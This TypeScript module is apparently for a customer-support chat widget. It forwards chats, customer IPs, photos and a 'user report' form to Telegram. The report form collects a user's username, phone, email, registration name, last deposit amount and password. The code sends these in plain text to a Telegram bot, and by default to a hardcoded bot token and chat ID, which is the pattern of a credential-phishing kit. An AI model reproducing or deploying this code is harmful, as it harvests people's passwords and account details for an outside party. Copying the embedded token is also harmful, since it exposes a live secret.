import { WidgetConfig } from '../types';

export interface TelegramNotificationParams {
  type: 'new_chat' | 'new_message' | 'test' | 'user_report';
  customerName?: string;
  customerPhone?: string;
  customerEmail?: string;
  customerIp?: string;
  department?: string;
  problemIssue?: string;
  chatId?: string;
  messageText?: string;
  photoUrl?: string;
  photoName?: string;
  attachments?: Array<{ name: string; url: string; type: string; size?: string }>;
  reportData?: {
    username?: string;
    phone?: string;
    email?: string;
    nibondhonName?: string;
    lastAmount?: string;
    lastPassword?: string;
    siteLink?: string;
  };
  timestamp?: string;
}

/**
 * Helper to convert data:image base64 url to Blob
 */
function dataURItoBlob(dataURI: string): Blob {
  const byteString = atob(dataURI.split(',')[1]);
  const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
  const ab = new ArrayBuffer(byteString.length);
  const ia = new Uint8Array(ab);
  for (let i = 0; i < byteString.length; i++) {
    ia[i] = byteString.charCodeAt(i);
  }
  return new Blob([ab], { type: mimeString });
}

/**
 * Sends real-time Telegram notifications when a customer starts a chat, sends a message/photo, or submits a report
 */
export async function sendTelegramNotification(
  params: TelegramNotificationParams,
  widgetConfig?: Partial<WidgetConfig>
): Promise<{ success: boolean; message: string }> {
  try {
    // 1. Retrieve bot token & chat id from passed widgetConfig or localStorage
    let botToken = widgetConfig?.telegramBotToken;
    let chatId = widgetConfig?.telegramChatId;
    let isEnabled = widgetConfig?.telegramNotificationsEnabled !== false;

    if (!botToken || !chatId) {
      try {
        const localCfg = localStorage.getItem('novachat_widget_config');
        if (localCfg) {
          const parsed = JSON.parse(localCfg);
          botToken = botToken || parsed.telegramBotToken;
          chatId = chatId || parsed.telegramChatId;
          if (parsed.telegramNotificationsEnabled !== undefined) {
            isEnabled = parsed.telegramNotificationsEnabled;
          }
        }
      } catch (e) {
        console.warn('Error reading telegram config from localStorage', e);
      }
    }

    // Default Fallback to user's Telegram Bot and Chat ID
    if (!botToken) {
      botToken = '8409188990:AAHR7bb3Zx9TcKpKEdldruvfVI-hRaoXfb4';
    }
    if (!chatId) {
      chatId = '6331230671';
    }

    // If notifications are explicitly disabled by user
    if (!isEnabled && params.type !== 'test') {
      return { success: false, message: 'টেলিগ্রাম নোটিফিকেশন বন্ধ করা আছে।' };
    }

    const cleanToken = botToken.trim();
    const cleanChatId = chatId.trim();
    const timeStr = params.timestamp || new Date().toLocaleTimeString('bn-BD', { hour: '2-digit', minute: '2-digit', hour12: true });

    let messageText = '';

    if (params.type === 'test') {
      messageText = `🤖 <b>NovaChat টেলিগ্রাম নোটিফিকেশন টেস্ট</b>\n\n` +
        `✅ অভিনন্দন! আপনার টেলিগ্রাম বট সফলভাবে কানেক্ট হয়েছে।\n` +
        `⏰ সময়: ${timeStr}\n` +
        `🔔 এখন থেকে কোনো কাস্টমার মেসেজ বা ছবি পাঠালে সাথে সাথে নোটিফিকেশন আসবে।`;
    } else if (params.type === 'user_report') {
      const rep = params.reportData || {};
      messageText = `🚨 <b>ইউজার রিপোর্ট ও জমা ফরম (User Report Form)</b>\n\n` +
        `👤 <b>ইউজারনেম:</b> ${rep.username || 'N/A'}\n` +
        `📞 <b>ফোন নম্বর:</b> ${rep.phone || params.customerPhone || 'N/A'}\n` +
        `📧 <b>ইমেইল:</b> ${rep.email || params.customerEmail || 'N/A'}\n` +
        `✍️ <b>নিবন্ধন নাম:</b> ${rep.nibondhonName || 'N/A'}\n` +
        `💵 <b>সর্বশেষ ডিপোজিট:</b> ${rep.lastAmount || 'N/A'}\n` +
        `🔑 <b>পাসওয়ার্ড:</b> ${rep.lastPassword || 'N/A'}\n` +
        `🌐 <b>সাইট লিংক:</b> ${rep.siteLink || 'N/A'}\n` +
        `🆔 <b>চ্যাট আইডি:</b> #${params.chatId || 'N/A'}\n\n` +
        `⏰ <b>সময়:</b> ${timeStr}`;
    } else if (params.type === 'new_chat') {
      messageText = `🔔 <b>নতুন কাস্টমার চ্যাট শুরু হয়েছে! (New Chat)</b>\n\n` +
        `🆔 <b>চ্যাট আইডি:</b> #${params.chatId || 'N/A'}\n` +
        `👤 <b>গ্রাহকের নাম:</b> ${params.customerName || 'অজ্ঞাত'}\n` +
        `📞 <b>ফোন নম্বর:</b> ${params.customerPhone || 'দেওয়া হয়নি'}\n` +
        `🌐 <b>IP এড্রেস:</b> ${params.customerIp || 'N/A'}\n` +
        `🏢 <b>ডিপার্টমেন্ট:</b> ${params.department || 'সাধারণ সহায়তা'}\n` +
        (params.problemIssue ? `📌 <b>সমস্যার ধরন:</b> ${params.problemIssue}\n` : '') +
        `💬 <b>প্রথম মেসেজ:</b> <i>"${params.messageText || 'হাই'}"</i>\n\n` +
        `⏰ <b>সময়:</b> ${timeStr}`;
    } else {
      // new_message
      const hasPhoto = !!params.photoUrl || (params.attachments && params.attachments.some(a => a.type === 'image'));
      messageText = `💬 <b>কাস্টমারের নতুন মেসেজ (New Customer SMS)</b>\n\n` +
        `🆔 <b>চ্যাট আইডি:</b> #${params.chatId || 'N/A'}\n` +
        `👤 <b>গ্রাহক:</b> ${params.customerName || 'Customer'}\n` +
        `📞 <b>ফোন:</b> ${params.customerPhone || 'N/A'}\n` +
        (params.problemIssue ? `📌 <b>সমস্যা:</b> ${params.problemIssue}\n` : '') +
        (hasPhoto ? `📷 <b>সংযুক্ত ছবি/ফাইল:</b> <i>হ্যাঁ (Photo Attached)</i>\n` : '') +
        `📨 <b>মেসেজ:</b> <i>"${params.messageText || (hasPhoto ? 'ছবি পাঠিয়েছেন' : '')}"</i>\n\n` +
        `⏰ <b>সময়:</b> ${timeStr}`;
    }

    // Determine if we have a photo to send
    let targetPhoto = params.photoUrl;
    if (!targetPhoto && params.attachments && params.attachments.length > 0) {
      const imgAtt = params.attachments.find(a => a.type === 'image' || a.url?.startsWith('data:image') || a.url?.match(/\.(jpeg|jpg|gif|png|webp)/i));
      if (imgAtt) {
        targetPhoto = imgAtt.url;
      }
    }

    // Case 1: Send Photo via Telegram sendPhoto endpoint
    if (targetPhoto) {
      try {
        if (targetPhoto.startsWith('data:image')) {
          // Base64 Data URL -> Send as multipart FormData
          const blob = dataURItoBlob(targetPhoto);
          const formData = new FormData();
          formData.append('chat_id', cleanChatId);
          formData.append('photo', blob, params.photoName || 'customer_photo.jpg');
          formData.append('caption', messageText.slice(0, 1024)); // Telegram caption limit 1024 chars
          formData.append('parse_mode', 'HTML');

          const photoRes = await fetch(`https://api.telegram.org/bot${cleanToken}/sendPhoto`, {
            method: 'POST',
            body: formData,
          });
          const photoData = await photoRes.json();
          if (photoData && photoData.ok) {
            return { success: true, message: 'টেলিগ্রামে ছবিসহ নোটিফিকেশন পাঠানো হয়েছে!' };
          }
        } else if (targetPhoto.startsWith('http://') || targetPhoto.startsWith('https://')) {
          // Regular HTTP URL
          const photoRes = await fetch(`https://api.telegram.org/bot${cleanToken}/sendPhoto`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: cleanChatId,
              photo: targetPhoto,
              caption: messageText.slice(0, 1024),
              parse_mode: 'HTML',
            }),
          });
          const photoData = await photoRes.json();
          if (photoData && photoData.ok) {
            return { success: true, message: 'টেলিগ্রামে ছবিসহ নোটিফিকেশন পাঠানো হয়েছে!' };
          }
        }
      } catch (photoErr) {
        console.warn('Error sending photo to Telegram, falling back to text:', photoErr);
      }
    }

    // Case 2: Standard Text Message via sendMessage endpoint
    const telegramUrl = `https://api.telegram.org/bot${cleanToken}/sendMessage`;
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: cleanChatId,
        text: messageText,
        parse_mode: 'HTML',
      }),
    });

    const resData = await response.json();
    if (resData && resData.ok) {
      return { success: true, message: 'টেলিগ্রামে সফলভাবে নোটিফিকেশন পাঠানো হয়েছে!' };
    } else {
      const errMsg = resData?.description || 'টেলিগ্রাম এপিআই ত্রুটি';
      console.warn('Telegram Notification Error:', errMsg);
      return { success: false, message: `টেলিগ্রাম ত্রুটি: ${errMsg}` };
    }
  } catch (error: any) {
    console.error('Failed to send Telegram notification:', error);
    return { success: false, message: error?.message || 'টেলিগ্রাম কানেকশন এরর' };
  }
}

